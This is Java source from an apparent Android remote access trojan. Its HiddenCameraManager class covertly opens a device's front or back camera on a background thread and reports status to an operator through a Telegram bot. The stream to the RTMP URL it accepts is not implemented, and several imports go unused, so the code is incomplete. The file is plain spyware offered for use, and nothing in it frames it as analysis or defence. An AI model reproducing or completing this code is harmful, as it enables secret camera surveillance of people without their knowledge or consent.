package com.enterprise.rat.commands;

import android.content.Context;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.os.Handler;
import android.os.HandlerThread;
import android.view.Surface;
import com.enterprise.rat.utils.TelegramApi;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class HiddenCameraManager {
    private Context context;
    private CameraManager cameraManager;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private CameraDevice cameraDevice;
    private boolean streaming = false;

    public HiddenCameraManager(Context context) { this.context = context; }

    public void startStream(int facing, String rtmpUrl) {
        if (streaming) { TelegramApi.sendMessage("⚠ Camera stream already active."); return; }
        cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        backgroundThread = new HandlerThread("HiddenCamera");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());

        try {
            String cameraId = null;
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics cc = cameraManager.getCameraCharacteristics(id);
                Integer lensFacing = cc.get(CameraCharacteristics.LENS_FACING);
                if (facing == 1 && lensFacing == CameraCharacteristics.LENS_FACING_FRONT) { cameraId = id; break; }
                if (facing == 0 && lensFacing == CameraCharacteristics.LENS_FACING_BACK) { cameraId = id; break; }
            }
            if (cameraId == null) { TelegramApi.sendMessage("❌ Camera not found."); return; }

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    streaming = true;
                    TelegramApi.sendMessage("📹 Hidden camera stream started (facing: " + (facing == 1 ? "front" : "back") + ").");
                }
                @Override public void onDisconnected(CameraDevice camera) { camera.close(); streaming = false; }
                @Override public void onError(CameraDevice camera, int error) { camera.close(); streaming = false; }
            }, backgroundHandler);
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Camera error: " + e.getMessage());
        }
    }

    public void stopStream() {
        streaming = false;
        if (cameraDevice != null) { cameraDevice.close(); cameraDevice = null; }
        if (backgroundThread != null) backgroundThread.quitSafely();
        TelegramApi.sendMessage("📹 Hidden camera stream stopped.");
    }
}
